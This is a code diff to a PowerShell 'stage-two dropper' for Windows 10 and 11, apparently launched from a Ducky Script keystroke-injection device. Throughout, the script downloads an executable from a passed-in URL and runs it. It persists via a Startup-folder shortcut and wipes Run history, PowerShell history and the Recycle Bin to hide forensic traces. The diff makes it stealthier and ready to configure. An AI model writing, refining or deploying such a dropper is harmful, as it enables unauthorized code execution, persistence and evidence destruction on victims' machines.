@@ -1,77 +1,85 @@
 # Intruder-Alert
 # Author: spac3gh0st
-# Description: This payload is meant to do an unauthorized file drop and execute it in a powershell script. See README.md file for more details.
+# Description: Stage-two dropper. Downloads a payload, executes it, establishes persistence,
+#              and clears forensic artifacts. See README.md for full details.
 # Target: Windows 10, 11
 #
-# Define the executable filename as a variable
-$varName = "svchost.exe"
+# ─────────────────────────────────────────────────────────────────
+# CONFIGURATION — set these before deploying
+# ─────────────────────────────────────────────────────────────────
 
-# Step 1: Create the directory C:\Windows\Temp\Cache
+# Name the dropped file will be saved as on the target machine
+$varName = "YOUR-FILENAME-HERE.exe"
+
+# Drop directory
+$dropDir = "$env:windir\temp\Cache"
+
+# Full path to the dropped file
+$outputFile = "$dropDir\$varName"
+
+# ─────────────────────────────────────────────────────────────────
+# STEP 1: Create drop directory
+# ─────────────────────────────────────────────────────────────────
 try {
-    mkdir "$env:windir\temp\Cache" -ErrorAction Stop
-    Write-Host "Directory C:\Windows\Temp\Cache created successfully."
+    New-Item -ItemType Directory -Path $dropDir -Force -ErrorAction Stop | Out-Null
 } catch {
-    Write-Host "Failed to create directory: $_"
+    # Silently continue — directory may already exist
 }
 
-# Step 2: Skip the Windows Defender exclusion since it requires elevated privileges
-
-# Step 3: Download the file from Dropbox to C:\Windows\Temp\Cache using the $varName variable
+# ─────────────────────────────────────────────────────────────────
+# STEP 2: Download payload
+# $dc is passed in from the stage-one launcher (the Ducky Script)
+# ─────────────────────────────────────────────────────────────────
 try {
-    $hookurl = "$dc"  # URL to be replaced with actual URL or passed as a parameter
-    $outputFile = "$env:windir\temp\Cache\$varName"
-    Invoke-WebRequest -Uri $hookurl -OutFile $outputFile -ErrorAction Stop
-    Write-Host "$varName downloaded successfully to C:\Windows\Temp\Cache."
+    Invoke-WebRequest -Uri $dc -OutFile $outputFile -ErrorAction Stop
 } catch {
-    Write-Host "Failed to download file: $_"
+    exit 1  # Abort if download fails — no point continuing
 }
 
-# Step 4: Execute the downloaded file
+# ─────────────────────────────────────────────────────────────────
+# STEP 3: Execute payload
+# ─────────────────────────────────────────────────────────────────
 try {
-    Start-Process $outputFile -ErrorAction Stop
-    Write-Host "$varName executed successfully."
+    Start-Process -FilePath $outputFile -ErrorAction Stop
 } catch {
-    Write-Host "Failed to execute svchost.exe: $_"
+    exit 1
 }
 
-# Step 5: Create a shortcut to the executable in the startup folder
+# ─────────────────────────────────────────────────────────────────
+# STEP 4: Persist via Startup folder shortcut
+# ─────────────────────────────────────────────────────────────────
 try {
     $shortcutPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$varName.lnk"
-    $s = (New-Object -COM WScript.Shell).CreateShortcut($shortcutPath)
-    $s.TargetPath = $outputFile
-    $s.Save()
-    Write-Host "Shortcut for $varName created successfully in Startup folder."
+    $shell = New-Object -COM WScript.Shell
+    $shortcut = $shell.CreateShortcut($shortcutPath)
+    $shortcut.TargetPath = $outputFile
+    $shortcut.Save()
 } catch {
-    Write-Host "Failed to create shortcut: $_"
+    # Non-fatal — continue to cleanup
 }
-############################################################################################################################################################
 
-#Credit goes to i-am-Jakoby, Luther, & Hobo. Amazing person and hacker.  
-<#
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
+# ─────────────────────────────────────────────────────────────────
+# STEP 5: Clear forensic artifacts
+# Credit: i-am-Jakoby, Luther, Hobo
+# ─────────────────────────────────────────────────────────────────
 
-# Delete contents of Temp folder 
+# Clear Run dialog history (MRU)
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" `
+        -Name "*" -ErrorAction Stop
+} catch {}
 
-# rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+# Clear PowerShell command history
+try {
+    Remove-Item -Path (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction Stop
+} catch {}
 
-# Delete run box history
+# Empty the Recycle Bin
+try {
+    Clear-RecycleBin -Force -ErrorAction Stop
+} catch {}
 
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
-		
-############################################################################################################################################################
-
-# Need to configure this in
-# Popup message to signal the payload is done
-#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
-
+# ─────────────────────────────────────────────────────────────────
+# Optional: popup to signal completion (uncomment for visible feedback in lab)
+# $done = New-Object -ComObject Wscript.Shell; $done.Popup("Update Completed", 1)
+# ─────────────────────────────────────────────────────────────────
